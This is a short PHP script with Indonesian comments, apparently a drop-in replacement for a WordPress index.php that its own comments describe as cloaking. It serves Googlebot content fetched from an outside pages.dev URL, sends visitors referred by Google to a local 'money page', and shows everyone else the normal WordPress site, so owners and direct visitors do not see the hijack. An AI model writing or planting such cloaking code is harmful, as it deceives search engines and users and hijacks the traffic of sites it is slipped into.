<?php
/**
 * 1. KONFIGURASI LINK & FILTERING
 * Masukkan link atau path file yang sesuai di sini.
 */
$amp_valid_source = 'https://amp-resetmeplease.pages.dev/'; // URL Konten AMP untuk Bot
$money_page       = 'home.php'; // File Landing Page/Halaman Utama

$googleBots = array(
    "Googlebot",
    "Google-Site-Verification",
    "Google-InspectionTool",
    "Googlebot-Mobile",
    "Googlebot-News",
    "Mediapartners-Google"
);

$isGoogleBot = false;
$userAgent   = isset($_SERVER['HTTP_USER_AGENT']) ? $_SERVER['HTTP_USER_AGENT'] : '';
$referer     = isset($_SERVER['HTTP_REFERER']) ? $_SERVER['HTTP_REFERER'] : '';

// 2. CEK APAKAH INI BOT GOOGLE
foreach ($googleBots as $bot) {
    if (stripos($userAgent, $bot) !== false) {
        $isGoogleBot = true;
        break;
    }
}

// 3. CEK APAKAH TRAFFIC DATANG DARI GOOGLE (REFERRER)
$isFromGoogle = (stripos($referer, 'google.com') !== false || stripos($referer, 'ampproject.org') !== false);

/**
 * 4. LOGIKA PENYARINGAN (CLOAKING)
 */

if ($isGoogleBot) {
    // Jika Bot Google: Berikan konten AMP murni agar validasi sukses
    $content = @file_get_contents($amp_valid_source);
    if ($content !== false) {
        echo $content;
    } else {
        echo "AMP Content Missing";
    }
    exit;
} 

if ($isFromGoogle) {
    // Jika User Klik dari Google: Arahkan ke Money Page
    if (file_exists($money_page)) {
        include($money_page);
    } else {
        // Jika file money_page tidak ada, jalankan WordPress (Fallback)
        define( 'WP_USE_THEMES', true );
        require __DIR__ . '/wp-blog-header.php';
    }
    exit;
}

/**
 * 5. JALANKAN WORDPRESS (DEFAULT)
 * Jika traffic direct atau bot lain, jalankan WordPress secara normal.
 * Anda juga bisa mengubah bagian ini untuk menampilkan AMP jika ingin lebih ketat.
 */
define( 'WP_USE_THEMES', true );

/** Loads the WordPress Environment and Template */
require __DIR__ . '/wp-blog-header.php';
